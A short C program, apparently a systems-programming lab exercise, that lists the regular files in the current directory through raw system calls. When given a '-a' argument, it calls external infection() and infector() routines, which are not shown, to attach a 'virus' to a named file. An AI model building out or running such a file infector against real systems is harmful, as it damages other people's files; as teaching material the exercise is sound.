#include "util.h"
#define STDERR 2
#define SYS_WRITE 4
#define SYS_CLOSE 6
#define SYS_OPEN 5
#define SYS_GETDENTS 141
#define STDOUT 1
#define O_RDONLY 0
#define DT_REG 8 


extern int system_call();
extern void infection();
extern void infector(char*);


typedef struct dirent{
    int offset;
    int d_ino;
    short length;
    char name[];
} dirent;

int main (int argc , char* argv[], char* envp[]) {
    char buffer[1024],data_type;
    char *infectedFileName = "";
    int numSys,file,infacted = 0;
    dirent* dirent_value;
    file = system_call(SYS_OPEN, ".", O_RDONLY, 0644);
    numSys = system_call(SYS_GETDENTS, file, &buffer, 1024);
    int i = 0 ;
    for(;i < argc;i++){
        if(strncmp(argv[i],"-a",2)==0){
            infectedFileName = argv[i]+2;
            infacted = 1;
            infection();
        }
    }
    
    i = 0;
    while(i < numSys){
        dirent_value = (dirent*)(buffer + i); 
        data_type = *(buffer + i + dirent_value->length - 1); 

        if((data_type == DT_REG )){
            system_call(SYS_WRITE, STDOUT, dirent_value->name, strlen(dirent_value->name));
            if(strcmp(infectedFileName,dirent_value->name) == 0){
                system_call(SYS_WRITE, STDOUT, "\t", 1);
                system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", 14);
            }
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        i = i + dirent_value->length;
    }
    if(infacted == 1){
        infector(infectedFileName);
    }
    system_call(SYS_CLOSE,file);
    return 0;
}